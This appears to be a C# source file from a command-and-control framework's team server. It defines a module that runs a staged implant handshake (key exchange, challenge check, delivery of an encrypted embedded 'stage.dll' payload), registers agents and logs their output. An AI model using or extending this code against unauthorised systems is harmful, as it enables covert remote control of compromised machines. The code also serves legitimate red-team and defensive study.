using Shared.Models;
using Shared.Utilities;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using TeamServer.Controllers;
using TeamServer.Interfaces;
using TeamServer.Models;

namespace TeamServer.ServerModules
{
    public class CoreServerModule : IServerModule
    {
        ServerController Server;
        AgentController Agent;

        public void Init(ServerController Server, AgentController Agent)
        {
            this.Server = Server;
            this.Agent = Agent;
        }

        public ServerModule GetModuleInfo()
        {
            return new ServerModule
            {
                Name = "Core",
                Commands = new List<ServerModule.Command>
                {
                    new ServerModule.Command
                    {
                        Name = "Stage0Request",
                        Delegate = HandleStage0Request
                    },
                    new ServerModule.Command
                    {
                        Name = "Stage1Request",
                        Delegate = HandleStage1Request
                    },
                    new ServerModule.Command
                    {
                        Name = "Stage2Request",
                        Delegate = HandleStage2Request
                    },
                    new ServerModule.Command
                    {
                        Name = "InitialCheckin",
                        Delegate = HandleInitialCheckin
                    },
                    new ServerModule.Command
                    {
                        Name = "AgentOutput",
                        Delegate = HandleAgentOutput
                    },
                    new ServerModule.Command
                    {
                        Name = "AgentError",
                        Delegate = HandleAgentError
                    }
                }
            };
        }

        void HandleStage0Request(string AgentID, C2Data C2Data)
        {
            var publicKey = Encoding.UTF8.GetString(C2Data.Data);
            Agent.Crypto.AddAgentPublicKey(AgentID, publicKey);

            var data = Utilities.SerialiseData(new C2Data
            {
                Module = "Core",
                Command = "Stage0Response",
                Data = Encoding.UTF8.GetBytes(Agent.Crypto.PublicKey)
            });

            Agent.SendAgentMessage(new AgentMessage
            {
                AgentID = AgentID,
                Data = data
            });
        }

        void HandleStage1Request(string AgentID, C2Data C2Data)
        {
            var sessionKey = Agent.Crypto.GenerateSessionKey(AgentID);
            var challenge = Agent.Crypto.GenerateChallenge(AgentID);

            var final = new byte[sessionKey.Length + challenge.Length];
            Buffer.BlockCopy(sessionKey, 0, final, 0, sessionKey.Length);
            Buffer.BlockCopy(challenge, 0, final, sessionKey.Length, challenge.Length);

            var data = Agent.Crypto.Encrypt(AgentID, new C2Data
            {
                Module = "Core",
                Command = "Stage1Response",
                Data = final
            });

            Agent.SendAgentMessage(new AgentMessage
            {
                AgentID = AgentID,
                Data = data
            });
        }

        void HandleStage2Request(string AgentID, C2Data C2Data)
        {
            var knownChallenge = Agent.Crypto.GetAgentChallenge(AgentID);

            if (knownChallenge != null)
            {
                if (knownChallenge.SequenceEqual(C2Data.Data))
                {
                    var stager = Helpers.GetEmbeddedResource("stage.dll");
                    var sessionKey = Agent.Crypto.GetSessionKey(AgentID);
                    var data = Utilities.EncryptData(new C2Data
                    {
                        Module = "Core",
                        Command = "Stage2Response",
                        Data = stager
                    }, sessionKey, out byte[] iv);

                    Agent.SendAgentMessage(new AgentMessage
                    {
                        AgentID = AgentID,
                        Data = data,
                        IV = iv
                    });
                }
            }
        }

        void HandleInitialCheckin(string AgentID, C2Data C2Data)
        {
            var metadata = Utilities.DeserialiseData<AgentMetadata>(C2Data.Data);
            metadata.LastSeen = DateTime.UtcNow;
            Agent.AddNewAgent(metadata);
        }

        void HandleAgentOutput(string AgentID, C2Data C2Data)
        {
            Agent.AddNewEvent(
                new AgentEvent(AgentID,
                AgentEvent.EventType.AgentOutput,
                Encoding.UTF8.GetString(C2Data.Data))
                );
        }

        void HandleAgentError(string AgentID, C2Data C2Data)
        {
            Agent.AddNewEvent(
                new AgentEvent(AgentID,
                AgentEvent.EventType.AgentError,
                Encoding.UTF8.GetString(C2Data.Data))
                );
        }
    }
}